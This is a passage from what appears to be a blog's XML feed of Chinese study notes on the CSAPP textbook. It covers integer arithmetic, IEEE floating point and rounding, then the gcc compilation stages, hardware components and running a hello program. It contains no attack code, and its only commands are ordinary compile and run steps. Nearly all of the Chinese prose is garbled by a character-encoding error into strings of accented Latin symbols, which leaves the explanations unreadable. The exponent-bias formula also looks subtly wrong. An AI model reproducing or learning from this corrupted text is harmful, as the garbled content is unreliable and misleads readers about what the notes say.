çš„æº¢å‡ºç»“æœï¼Œè¿™ä¸æ˜¯åŸå§‹å€¼çš„æ­£ç¡®è¡¨ç¤ºã€‚</p><h2 id="æ•´æ•°è¿ç®—"><a href="#æ•´æ•°è¿ç®—" class="headerlink" title="æ•´æ•°è¿ç®—"></a>æ•´æ•°è¿ç®—</h2><h4 id="åŠ æ³•"><a href="#åŠ æ³•" class="headerlink" title="åŠ æ³•"></a>åŠ æ³•</h4><p>æ— ç¬¦å·åŠ æ³•éµå¾ªäºŒè¿›åˆ¶çš„åŠ æ³•è§„åˆ™ï¼Œä»æœ€ä½ä½ï¼ˆæœ€å³è¾¹çš„ä½ï¼‰å¼€å§‹é€ä½ç›¸åŠ ï¼Œè¿›ä½ä¼šä¼ é€’åˆ°é«˜ä½ã€‚</p><p>è¡¥ç åŠ æ³•ä»ç„¶éµå¾ªæ ‡å‡†çš„äºŒè¿›åˆ¶åŠ æ³•è§„åˆ™ï¼Œä½†ç¬¦å·ä½ä¹Ÿä¼šå‚ä¸è®¡ç®—ã€‚å½“æ‰§è¡Œè¡¥ç åŠ æ³•æ—¶ï¼Œç¬¦å·ä½ä¸å…¶ä»–ä½ä¸€èµ·ç›¸åŠ ï¼Œå¦‚æœæœ‰æº¢å‡ºï¼Œåˆ™æº¢å‡ºä¼šå½±å“ç¬¦å·ä½ã€‚</p><h4 id="ä¹˜æ³•"><a href="#ä¹˜æ³•" class="headerlink" title="ä¹˜æ³•"></a>ä¹˜æ³•</h4><p>æ— ç¬¦å·ä¹˜æ³•éµå¾ªæ ‡å‡†çš„ä¹˜æ³•è§„åˆ™ï¼Œä¹˜æ³•æœ‰ <code>x*y=(x*y) mod 2^w</code> å…¶ä¸­ <code>w</code> ä¸º <code>x </code>å’Œ <code>y</code> çš„ä½æ•°ã€‚éœ€è¦æ³¨æ„ï¼Œå› ä¸º <code>x</code> å’Œ <code>y</code> ç›¸ä¹˜å¯èƒ½å¾—åˆ°æœ€å¤§ <code>2w</code> ä½çš„æ•´æ•°ï¼Œå› æ­¤å¯èƒ½ä¼šå‘ç”Ÿæˆªæ–­ã€‚</p><p>è¡¥ç ä¹˜æ³•åŒæ ·éµå¾ªæ ‡å‡†çš„ä¹˜æ³•è§„åˆ™ï¼Œä½†ç¬¦å·ä½ä¹Ÿä¼šå‚ä¸è®¡ç®—ã€‚å¯ä»¥ç†è§£ä¸ºå…ˆåƒæ— ç¬¦å·ä¹˜æ³•ï¼Œä¹˜å‡ºæ¥æˆªæ–­ä¹‹åå†è½¬ä¸ºè¡¥ç å°±æ˜¯ç»“æœã€‚</p><h4 id="é™¤ä»¥2çš„å¹‚"><a href="#é™¤ä»¥2çš„å¹‚" class="headerlink" title="é™¤ä»¥2çš„å¹‚"></a>é™¤ä»¥2çš„å¹‚</h4><p>é™¤ä»¥ 2 çš„å¹‚é€šè¿‡å³ç§»è¿ç®—æ¥å®ç°ï¼Œæ— ç¬¦å·å’Œè¡¥ç æ•°åˆ†åˆ«ä½¿ç”¨é€»è¾‘ç§»ä½å’Œç®—æœ¯ç§»ä½æ¥å®ç°ã€‚</p><h2 id="æµ®ç‚¹æ•°"><a href="#æµ®ç‚¹æ•°" class="headerlink" title="æµ®ç‚¹æ•°"></a>æµ®ç‚¹æ•°</h2><h3 id="äºŒè¿›åˆ¶å°æ•°"><a href="#äºŒè¿›åˆ¶å°æ•°" class="headerlink" title="äºŒè¿›åˆ¶å°æ•°"></a>äºŒè¿›åˆ¶å°æ•°</h3><p>äºŒè¿›åˆ¶å°æ•°çš„è¡¨ç¤ºæ–¹æ³•å’Œåè¿›åˆ¶åŸç†ç›¸åŒï¼Œåªä¸è¿‡åè¿›åˆ¶çš„åº•æ•°ä¸º 10ï¼ŒäºŒè¿›åˆ¶çš„æƒå€¼åº•æ•°å˜æˆäº† 2ã€‚</p><h3 id="IEEE-æµ®ç‚¹è¡¨ç¤º"><a href="#IEEE-æµ®ç‚¹è¡¨ç¤º" class="headerlink" title="IEEE æµ®ç‚¹è¡¨ç¤º"></a>IEEE æµ®ç‚¹è¡¨ç¤º</h3><p>IEEEæµ®ç‚¹æ ‡å‡†ç”¨å¦‚ä¸‹çš„å…¬å¼æ¥è¡¨ç¤ºä¸€ä¸ªæ•°ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/2-IEEE%E6%B5%AE%E7%82%B9%E6%95%B0%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95.png"></p><ul><li>ç¬¦å·(s)ï¼š<code>1</code> è¡¨ç¤ºè´Ÿæ•°ï¼Œ<code>0</code> è¡¨ç¤ºæ­£æ•°</li><li>å°¾æ•°(M)ï¼šæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶çš„å°æ•°ï¼Œå–å€¼èŒƒå›´ä¸º <code>[1,2)</code></li><li>é˜¶ç (E)ï¼šä¸ºæµ®ç‚¹æ•°åŠ æƒã€‚</li></ul><blockquote><p>è¿™ä¸ªæ–¹æ³•å°±ç›¸å½“äºæ˜¯äºŒè¿›åˆ¶çš„ç§‘å­¦è®¡æ•°æ³•ã€‚</p></blockquote><p>æµ®ç‚¹æ•°å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªå­—æ®µï¼šç¬¦å·ä½ï¼Œé˜¶ç å­—æ®µå’Œå°æ•°å­—æ®µã€‚</p><p>æˆ‘ä»¬ç»å¸¸ç”¨çš„æµ®ç‚¹æ•°æœ‰ä¸¤ç±»ï¼Œå•ç²¾åº¦æµ®ç‚¹æ•° <code>float</code> å’ŒåŒç²¾åº¦æµ®ç‚¹æ•° <code>double</code>ï¼Œ<code>float</code> ä¸º <code>32</code> ä½ï¼Œ<code>double</code> ä¸º <code>64</code> ä½ã€‚</p><ul><li>å¯¹äº <code>float</code>ï¼Œæœ€é«˜ä½è¡¨ç¤ºç¬¦å·ä½ï¼›ç¬¬ <code>2</code> åˆ°ç¬¬ <code>9</code> ä½è¡¨ç¤ºé˜¶ç ï¼Œç”¨æ¥æŒ‡ç¤ºæŒ‡æ•°ä½ï¼›ç¬¬ <code>10</code> ä½åˆ°ç¬¬ <code>32</code> ä½å‡ä¸ºå°¾æ•°</li><li>å¯¹äº <code>double</code>ï¼Œæœ€é«˜ä½è¡¨ç¤ºç¬¦å·ä½ï¼›ç¬¬ <code>2</code> åˆ°ç¬¬ <code>12</code> ä½è¡¨ç¤ºé˜¶ç ï¼Œç”¨æ¥æŒ‡ç¤ºæŒ‡æ•°ä½ï¼›ç¬¬ <code>13</code> ä½åˆ°ç¬¬ <code>64</code> ä½å‡ä¸ºå°¾æ•°</li></ul><p>æ ¹æ®é˜¶ç éƒ¨åˆ†çš„å€¼ï¼Œè¢«ç¼–ç çš„å€¼æœ‰ <code>3 </code>ä¸­è¡¨ç¤ºçš„æƒ…å†µï¼š</p><ul><li><p>è§„æ ¼åŒ–çš„å€¼ï¼šé˜¶ç ä½ä¸ä¸ºå…¨ <code>0</code> ä¹Ÿä¸ä¸ºå…¨ <code>1</code>ã€‚æ­¤æ—¶é˜¶ç å­—æ®µè¢«è§£é‡Šä¸ºä»¥åç½®å½¢å¼è¡¨ç¤ºçš„æœ‰ç¬¦å·æ•´æ•°ã€‚å¯¹åº”çš„é˜¶ç çš„å€¼æ˜¯ <code>E=e-(2^k-1)</code></p></li><li><p>éè§„æ ¼åŒ–çš„å€¼ï¼šå½“é˜¶ç ä½å…¨ä¸º <code>0</code> çš„æ—¶å€™ï¼Œè¡¨ç¤ºéè§„æ ¼åŒ–çš„å€¼ã€‚æ­¤æ—¶é˜¶ç å­—æ®µè¢«è§£é‡Šä¸ºä»¥åç½®å½¢å¼è¡¨ç¤ºçš„æœ‰ç¬¦å·æ•´æ•°ã€‚å¯¹åº”çš„é˜¶ç çš„å€¼æ˜¯ <code>E=1-(2^k-1)</code></p><p>éæ ¼å¼åŒ–æ•°å¯ä»¥ç”¨æ¥è¡¨ç¤ºéå¸¸æ¥è¿‘äº 0.0 çš„æ•°ï¼Œå®ƒæä¾›äº†ä¸€ç§é€æ¸æº¢å‡ºçš„å±æ€§ä½¿å¯èƒ½çš„æ•°å€¼å‡åŒ€çš„æ¥è¿‘äº 0.0ã€‚</p></li><li><p>ç‰¹æ®Šå€¼ï¼šåŒ…æ‹¬ <code>INF</code> å’Œ <code>NAN</code>ï¼Œé˜¶ç ä½å…¨ä¸º <code>1</code> çš„æ—¶å€™ï¼Œè‹¥å°¾æ•°å…¨ä¸º0ï¼Œåˆ™å¾—åˆ° <code>INF</code>ï¼Œè‹¥ä¸å…¨ä¸º <code>0</code> åˆ™å¾—åˆ° <code>NAN</code>ã€‚</p></li></ul><h4 id="èˆå…¥"><a href="#èˆå…¥" class="headerlink" title="èˆå…¥"></a>èˆå…¥</h4><p>å› ä¸ºæµ®ç‚¹æ•°çš„è¡¨ç¤ºæ–¹æ³•é™åˆ¶äº†æµ®ç‚¹æ•°çš„èŒƒå›´å’Œç²¾åº¦ï¼Œå¤šä»¥æˆ‘ä»¬éœ€è¦åˆ©ç”¨ç‰¹å®šçš„ç³»ç»Ÿçš„æ–¹æ³•ä½¿å­˜å‚¨çš„æ•°æ®æ— é™æ¥è¿‘äºå®é™…çš„æ•°å­—ï¼Œè¿™å°±æ˜¯èˆå…¥çš„å·¥ä½œã€‚</p><p>æ€»å…±æœ‰å››ç§èˆå…¥çš„æ–¹æ³•ï¼Œä¸‹è¡¨ä¸ºåŸç†ç¤ºä¾‹ï¼š</p><table><thead><tr><th align="center">æ–¹å¼</th><th align="center">1.40</th><th align="center">1.60</th><th align="center">1.50</th><th align="center">2.50</th><th align="center">-1.50</th></tr></thead><tbody><tr><td align="center">å‘å¶æ•°èˆå…¥</td><td align="center">1</td><td align="center">2</td><td align="center">2</td><td align="center">2</td><td align="center">-2</td></tr><tr><td align="center">å‘é›¶èˆå…¥</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">2</td><td align="center">-1</td></tr><tr><td align="center">å‘ä¸‹èˆå…¥</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">2</td><td align="center">-2</td></tr><tr><td align="center">å‘ä¸Šèˆå…¥</td><td align="center">2</td><td align="center">2</td><td align="center">2</td><td align="center">3</td><td align="center">-1</td></tr></tbody></table><blockquote><p>å…¶ä¸­ï¼Œå‘å¶æ•°èˆå…¥ä¹Ÿå°±æ˜¯å‘æœ€è¿‘çš„å€¼èˆå…¥ï¼Œå…¶ä»–çš„æ–¹æ³•åŸç†å‡å’Œå­—é¢å«ä¹‰ç›¸åŒ</p></blockquote><h4 id="æµ®ç‚¹è¿ç®—"><a href="#æµ®ç‚¹è¿ç®—" class="headerlink" title="æµ®ç‚¹è¿ç®—"></a>æµ®ç‚¹è¿ç®—</h4><p>æµ®ç‚¹æ•°çš„åŠ æ³•å’Œå‡æ³•éµå¾ªä¸€èˆ¬çš„äºŒè¿›åˆ¶åŠ æ³•å’Œå‡æ³•è§„åˆ™ï¼Œä½†éœ€è¦é¢å¤–è€ƒè™‘æŒ‡æ•°éƒ¨åˆ†çš„å¯¹é½ã€‚</p><p>æµ®ç‚¹æ•°çš„ä¹˜æ³•å’Œé™¤æ³•ä¹Ÿéµå¾ªä¸€èˆ¬çš„äºŒè¿›åˆ¶ä¹˜æ³•å’Œé™¤æ³•è§„åˆ™ï¼Œä½†éœ€è¦é¢å¤–çš„å¤„ç†æ¥æ­£ç¡®å¤„ç†æŒ‡æ•°å’Œå°¾æ•°ã€‚å…·ä½“æ¥è¯´ï¼Œä¹˜æ³•æ—¶å°†æŒ‡æ•°ç›¸åŠ ï¼Œå°¾æ•°ç›¸ä¹˜ï¼Œç„¶åå¯¹ç»“æœè¿›è¡Œè§„èŒƒåŒ–ã€‚é™¤æ³•æ—¶å°†æŒ‡æ•°ç›¸å‡ï¼Œå°¾æ•°ç›¸é™¤ï¼Œç„¶åå¯¹ç»“æœè¿›è¡Œè§„èŒƒåŒ–ã€‚</p><hr><p>å¼€å­¦å–½ğŸ¥²</p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬ä¸€ç«  è®¡ç®—æœºç³»ç»Ÿæ¼«æ¸¸ æ€»ç»“</title>
    <link href="/2023/08/31/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/"/>
    <url>/2023/08/31/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸€ç« æ˜¯æ€»è®ºï¼ŒæŠŠä¸€ä¸‹ç®€å•çš„æ¦‚å¿µæ¢³ç†äº†ä¸€ä¸‹</p><span id="more"></span><h1 id="ç¨‹åºçš„ç¼–è¯‘"><a href="#ç¨‹åºçš„ç¼–è¯‘" class="headerlink" title="ç¨‹åºçš„ç¼–è¯‘"></a>ç¨‹åºçš„ç¼–è¯‘</h1><p>å¸¦æœ‰ <code>.c</code> åç¼€çš„Cè¯­è¨€æºæ–‡ä»¶æ˜¯ä¸èƒ½ç›´æ¥åœ¨ç¨‹åºä¸Šè¿è¡Œçš„ï¼Œéœ€è¦å°†å…¶ä¸­çš„Cè¯­å¥è½¬æ¢ä¸ºæœºå™¨è¯­è¨€ï¼ŒæŒ‰ç…§<strong>å¯æ‰§è¡Œç›®æ ‡ç¨‹åº</strong>çš„æ ¼å¼æ‰“å¥½åŒ…ï¼Œå¹¶ä»¥äºŒè¿›åˆ¶ç£ç›˜æ–‡ä»¶çš„å½¢å¼å­˜æ”¾èµ·æ¥ã€‚ç›®æ ‡ç¨‹åºä¹Ÿç§°ä¸º<strong>å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ã€‚</strong></p><p>æˆ‘ä»¬å¸¸ä½¿ç”¨çš„ç¼–è¯‘å‘½ä»¤ <code>gcc -o hello hello.c</code> ï¼Œå…·ä½“çš„ç¼–è¯‘è¿‡ç¨‹åˆ†ä¸ºå››ä¸ªé˜¶æ®µï¼š(1) é¢„å¤„ç†ï¼›(2) ç¼–è¯‘ï¼›(3) æ±‡ç¼–ï¼›(4) é“¾æ¥ï¼›</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png"></p><h3 id="01-é¢„å¤„ç†"><a href="#01-é¢„å¤„ç†" class="headerlink" title="01 é¢„å¤„ç†"></a>01 é¢„å¤„ç†</h3><p>é¢„å¤„ç†å™¨å°†æ ¹æ®å°†è¯»å–æ‰€æœ‰çš„ <code>#include</code> å¤´æ–‡ä»¶ä»¥åŠå®å®šä¹‰ï¼ŒæŠŠä»–ä»¬æ’å…¥æ–‡æœ¬ä¸­ï¼Œå°†åŸæœ¬çš„å‘½ä»¤æ›¿æ¢æˆå…¶å…·ä½“è¯¦ç»†çš„å†…å®¹ã€‚</p><p>å¤„ç†ç»“æœæ˜¯å¾—åˆ° <code>.i</code> æ–‡æœ¬æ–‡ä»¶</p><h3 id="02-ç¼–è¯‘"><a href="#02-ç¼–è¯‘" class="headerlink" title="02 ç¼–è¯‘"></a>02 ç¼–è¯‘</h3><p>ç¼–è¯‘å™¨å°† <code>.i</code> æ–‡ä»¶è½¬æ¢ä¸º <code>.s</code> æ–‡ä»¶ï¼Œå…¶ä»£ç æŒ‡ä»¤ç”±Cè¯­è¨€ä»£ç è½¬ä¸ºæ±‡ç¼–æŒ‡ä»¤ã€‚æ–‡ä»¶ä¸­åŒ…å«å‡½æ•° main çš„å®šä¹‰ï¼Œç±»ä¼¼ä¸‹å›¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">main:<br>pushq %rbp<br>movq %rsp ,%rbp<br>leaq .LC0 ,%rdi<br>call puts@PLT<br>movl $0 ,%eax<br>popq %rbp<br>ret<br></code></pre></td></tr></table></figure><h3 id="03-æ±‡ç¼–"><a href="#03-æ±‡ç¼–" class="headerlink" title="03 æ±‡ç¼–"></a>03 æ±‡ç¼–</h3><p>æ±‡ç¼–å™¨å°† <code>.s</code> æ–‡ä»¶çš„äººç±»å¯è¯»çš„æ–‡æœ¬æŒ‡ä»¤è½¬æ¢ä¸ºè®¡ç®—æœºå¯è¯»çš„äºŒè¿›åˆ¶æœºå™¨è¯­è¨€æŒ‡ä»¤ï¼ŒæŠŠè¿™äº›æŒ‡ä»¤æ‰“åŒ…æˆä¸€ç§å«åš<strong>å¯é‡å®šä½ç›®æ ‡ç¨‹åº</strong>ï¼ˆrelocatable object programï¼‰çš„æ ¼å¼ï¼Œå¹¶å°†ç»“æœä¿å­˜åœ¨ <code>.o</code> æ–‡ä»¶ä¸­ã€‚</p><p>æ­¤æ—¶çš„æ–‡ä»¶ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€çš„è¯å†…å®¹å°†æ˜¯ä¹±ç ã€‚</p><h3 id="04-é“¾æ¥"><a href="#04-é“¾æ¥" class="headerlink" title="04 é“¾æ¥"></a>04 é“¾æ¥</h3><p>é“¾æ¥å™¨ .o ç›®æ ‡æ–‡ä»¶ä¸å…¶ä»–ç›®æ ‡æ–‡ä»¶ã€åº“æ–‡ä»¶ã€å¯åŠ¨æ–‡ä»¶ç­‰é“¾æ¥èµ·æ¥<strong>ç”Ÿæˆå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶</strong>ã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬åœ¨ç¨‹åºä¸­è°ƒç”¨ printf å‡½æ•°ï¼Œprintf å‡½æ•°å­˜åœ¨äºä¸€ä¸ªåä¸º printf.o çš„å•ç‹¬çš„é¢„ç¼–è¯‘å¥½äº†çš„ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¿…é¡»ç”±é“¾æ¥å™¨åˆå¹¶åˆ°æˆ‘ä»¬çš„ hello.o ç¨‹åºä¸­ã€‚</p><h1 id="ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ"><a href="#ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ" class="headerlink" title="ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ"></a>ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ</h1><p>ç³»ç»Ÿç¡¬ä»¶ç”±å››éƒ¨åˆ†ç»„æˆï¼šæ€»çº¿ã€I&#x2F;Oè®¾å¤‡ã€ä¸»å­˜å’Œå¤„ç†å™¨</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%A1%AC%E4%BB%B6%E7%BB%84%E6%88%90.png"></p><h3 id="æ€»çº¿"><a href="#æ€»çº¿" class="headerlink" title="æ€»çº¿"></a>æ€»çº¿</h3><p>æ€»çº¿å°±æ˜¯è´¯ç©¿æ•´ä¸ªç³»ç»Ÿçš„ç”µå­ç®¡é“ï¼Œè´Ÿè´£åœ¨å„ä¸ªéƒ¨ä»¶ä¹‹é—´ä¼ é€’ä¿¡æ¯ã€‚</p><p>é€šå¸¸æ€»çº¿è¢«è®¾è®¡æˆä¼ é€å®šé•¿çš„å­—èŠ‚å—ï¼Œä¹Ÿå°±æ˜¯è®¡ç®—æœºå¤„ç†æ•°æ®çš„åŸºæœ¬å•å…ƒå¤§å°<strong>å­—ï¼ˆwordï¼‰</strong>ã€‚ä¸åŒç³»ç»Ÿä¸­çš„æœºå™¨å­—é•¿ä¸åŒï¼Œå¤§éƒ¨åˆ†æ˜¯ 4 å­—èŠ‚ï¼ˆ32ä½ï¼‰å’Œ 8 å­—èŠ‚ï¼ˆ64ä½ï¼‰ã€‚</p><h3 id="I-x2F-O-è®¾å¤‡"><a href="#I-x2F-O-è®¾å¤‡" class="headerlink" title="I&#x2F;O è®¾å¤‡"></a>I&#x2F;O è®¾å¤‡</h3><p>I&#x2F;Oï¼ˆè¾“å…¥&#x2F;è¾“å‡ºï¼‰è®¾å¤‡å°±æ˜¯ç³»ç»Ÿä¸å¤–ç•Œè”ç³»çš„é€šé“ã€‚åƒé”®ç›˜é¼ æ ‡ï¼Œä»¥åŠç£ç›˜é©±åŠ¨å™¨ã€ç½‘ç»œé©±åŠ¨å™¨ä¹‹ç±»çš„ç¡¬ä»¶éƒ½æ˜¯ I&#x2F;O è®¾å¤‡ã€‚</p><p>æ¯ä¸ª I&#x2F;O è®¾å¤‡éƒ½é€šè¿‡ä¸€ä¸ª<strong>æ§åˆ¶å™¨</strong>æˆ–<strong>é€‚é…å™¨</strong>ä¸ I&#x2F;O æ€»çº¿ç›¸è¿ï¼Œè´Ÿè´£åœ¨äºŒè€…ä¹‹é—´ä¼ é€’ä¿¡æ¯ã€‚</p><blockquote><p>æ§åˆ¶å™¨æ˜¯ I&#x2F;O è®¾å¤‡æœ¬èº«æˆ–è€…ç³»ç»Ÿçš„ä¸»å°åˆ¶ç”µè·¯æ¿ï¼ˆä¸»æ¿ï¼‰ä¸Šçš„èŠ¯ç‰‡ç»„</p><p>é€‚é…å™¨æ˜¯ä¸€å—æ’åœ¨ä¸»æ¿æ’æ§½ä¸Šçš„å¡</p></blockquote><h3 id="ä¸»å­˜"><a href="#ä¸»å­˜" class="headerlink" title="ä¸»å­˜"></a>ä¸»å­˜</h3><p>ä»ç‰©ç†ä¸Šæ¥è¯´ï¼Œä¸»å­˜æ˜¯ç”±ä¸€ç»„<strong>åŠ¨æ€éšæœºå­˜å–å­˜å‚¨å™¨</strong>ï¼ˆDRAMï¼‰èŠ¯ç‰‡ç»„æˆçš„ã€‚ä»é€»è¾‘ä¸Šæ¥è¯´ï¼Œå­˜å‚¨å™¨æ˜¯ä¸€ä¸ªçº¿æ€§çš„å­—èŠ‚æ•°ç»„ï¼Œæ¯ä¸ªå­—èŠ‚éƒ½æœ‰å…¶å”¯ä¸€çš„åœ°å€ï¼ˆæ•°ç»„ç´¢å¼•ï¼‰ï¼Œè¿™äº›åœ°å€æ˜¯ä»é›¶å¼€å§‹çš„ã€‚</p><blockquote><p>ä¸»å­˜ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼šåœ¨è´­ä¹°ç”µè„‘æ—¶åœ¨è¯¦æƒ…é¡µä¸­çœ‹åˆ°çš„â€œè¿è¡Œå†…å­˜â€ï¼Œä»£è¡¨ç¨‹åºå¯ä»¥åŒæ—¶è¿è¡Œçš„ç¨‹åºå’Œæ•°æ®å¤§å°</p></blockquote><h3 id="å¤„ç†å™¨"><a href="#å¤„ç†å™¨" class="headerlink" title="å¤„ç†å™¨"></a>å¤„ç†å™¨</h3><p><strong>ä¸­å¤®å¤„ç†å•å…ƒ</strong>ï¼ˆCPUï¼‰ï¼Œç®€ç§°<strong>å¤„ç†å™¨</strong>ï¼Œæ˜¯è§£é‡Šï¼ˆæˆ–æ‰§è¡Œï¼‰å­˜å‚¨åœ¨ä¸»å­˜ä¸­æŒ‡ä»¤çš„å¼•æ“ã€‚å¤„ç†å™¨çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªå¤§å°ä¸ºä¸€ä¸ªå­—çš„å­˜å‚¨è®¾å¤‡ï¼ˆæˆ–<strong>å¯„å­˜å™¨</strong>ï¼‰ï¼Œç§°ä¸º<strong>ç¨‹åºè®¡æ•°å™¨</strong>ï¼ˆPCï¼‰ã€‚</p><p>åœ¨ä»»ä½•æ—¶åˆ»ï¼ŒPC éƒ½æŒ‡å‘ä¸»å­˜ä¸­çš„æŸæ¡æœºå™¨è¯­è¨€æŒ‡ä»¤ï¼ˆå³å«æœ‰è¯¥æ¡æŒ‡ä»¤çš„åœ°å€ï¼‰ã€‚</p><blockquote><p>æ­¤ PC é â€œä¸ªäººè®¡ç®—æœºâ€ PC å“¦</p></blockquote><p>ä»ç³»ç»Ÿé€šç”µå¼€å§‹ï¼Œç›´åˆ°ç³»ç»Ÿæ–­ç”µï¼Œå¤„ç†å™¨ä¸€ç›´åœ¨ä¸æ–­åœ°æ‰§è¡Œç¨‹åºè®¡æ•°å™¨æŒ‡å‘çš„æŒ‡ä»¤ï¼Œå†æ›´æ–°ç¨‹åºè®¡æ•°å™¨ï¼Œä½¿å…¶æŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œä¸æ–­å¾ªç¯å¾€å¤ã€‚è¿™ä¸ªè¿‡ç¨‹å›´ç»•ç€ä¸»å­˜ã€<strong>å¯„å­˜å™¨æ–‡ä»¶</strong>ï¼ˆregister fileï¼‰å’Œ<strong>ç®—æœ¯&#x2F;é€»è¾‘å•å…ƒ</strong>ï¼ˆALUï¼‰è¿›è¡Œã€‚</p><h3 id="è¿è¡Œä¸€ä¸ªç¨‹åº"><a href="#è¿è¡Œä¸€ä¸ªç¨‹åº" class="headerlink" title="è¿è¡Œä¸€ä¸ªç¨‹åº"></a>è¿è¡Œä¸€ä¸ªç¨‹åº</h3><p>å‡è®¾æˆ‘ä»¬ç›®æ ‡è¿è¡Œçš„ç¨‹åºå°†è¾“å‡º â€œhello worldï¼â€ï¼Œæˆ‘ä»¬åœ¨å‘½ä»¤è¡Œè§£é‡Šå™¨shellä¸­ç›´æ¥è¾“å…¥æ–‡ä»¶åï¼Œç³»ç»Ÿå°±ä¼šæ‰§è¡Œæ–‡ä»¶å¹¶ä½œå‡ºç›¸åº”çš„è¾“å‡ºã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">./hello</span><br>hello worldï¼<br></code></pre></td></tr></table></figure><p>åœ¨è®¡ç®—æœºå±‚é¢ï¼Œè¿è¡Œç¨‹åºå°±æ˜¯ä¸æ–­å¤åˆ¶çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œå¤§è‡´åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæµç¨‹ï¼š</p><p>é¦–å…ˆæˆ‘ä»¬åœ¨é”®ç›˜ä¸Šè¾“å…¥å­—ç¬¦ä¸² <code>â€./helloâ€œ</code> ï¼Œshell ä¼šå°†å…¶å­—ç¬¦é€ä¸€è¯»å…¥å¯„å­˜å™¨ï¼Œå†æŠŠä»–ä»¬æ”¾å…¥å†…å­˜ä¸­ã€‚</p><p>![](&#x2F;img&#x2F;CSAPP-ç¬¬ä¸€ç« -è®¡ç®—æœºç³»ç»Ÿæ¼«æ¸¸-æ€»ç»“&#x2F;1-read hello from keyboard.png)</p><p>æ•²å‡»å›è½¦é”®ä»¥åï¼Œshell å°±ä¼šæ‰§è¡Œä¸€ç³»åˆ—æŒ‡ä»¤æ¥åŠ è½½å¯æ‰§è¡Œçš„ hello æ–‡ä»¶ï¼Œè¿™äº›æŒ‡ä»¤å°†ä¼šæŠŠç›®æ ‡æ–‡ä»¶ä¸­çš„ä»£ç å’Œæ•°æ®å¤åˆ¶åˆ°ä¸»å­˜ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E4%BB%8E%E7%A3%81%E7%9B%98%E5%8A%A0%E8%BD%BD%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%88%B0%E4%B8%BB%E5%AD%98.png"></p><p>æ¥ä¸‹æ¥ï¼ŒCPUå°±ä¼šå¼€å§‹å¤„ç† ç›®æ ‡ç¨‹åºçš„ main ç¨‹åºä¸­çš„æœºå™¨è¯­è¨€æŒ‡ä»¤ã€‚è¿™äº›æŒ‡ä»¤å°†ä¼šæŠŠå°†è¦è¾“å‡ºçš„å­—ç¬¦ä¸²ä¸­çš„å­—èŠ‚ä»ä¸»å­˜å¤åˆ¶åˆ°å¯„å­˜å™¨æ–‡ä»¶ï¼Œå†ä»å¯„å­˜å™¨å¤åˆ¶åˆ°æ˜¾ç¤ºè®¾å¤‡ï¼Œæœ€ç»ˆæ˜¾ç¤ºåˆ°å±å¹•ä¸Šã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E5%B0%86%E8%BE%93%E5%87%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%8E%E5%AD%98%E5%82%A8%E5%99%A8%E5%86%99%E5%88%B0%E6%98%BE%E7%A4%BA%E5%99%A8.png"></p><h1 id="æ“ä½œç³»ç»Ÿ"><a href="#æ“ä½œç³»ç»Ÿ" 